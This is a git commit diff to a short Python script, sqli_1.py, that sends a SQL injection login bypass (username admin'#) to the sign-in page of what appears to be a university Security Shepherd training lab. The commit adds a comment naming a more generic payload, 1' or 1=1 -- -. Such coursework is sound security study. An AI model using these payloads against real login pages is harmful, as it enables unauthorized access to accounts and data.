0f1b5ce5c210a608217f053dfbafdeb48526e3fc
jhaos <julapas92@gmail.com>
2019-09-11 18:54:23 +0200

    Update sqli_1.py

--- sqli/sqli_1.py
+++ sqli/sqli_1.py
@@ -2,7 +2,7 @@ import requests
 
 targetUrl = "http://shepherd.ii.uib.no:8001/signIn"
 param = {"inputName":"admin'#", "inputPassword":"not_needed"}
-
+#also we can use 1' or 1=1 -- - in the input name that is more generic
 
 result = requests.post(targetUrl, param)
 
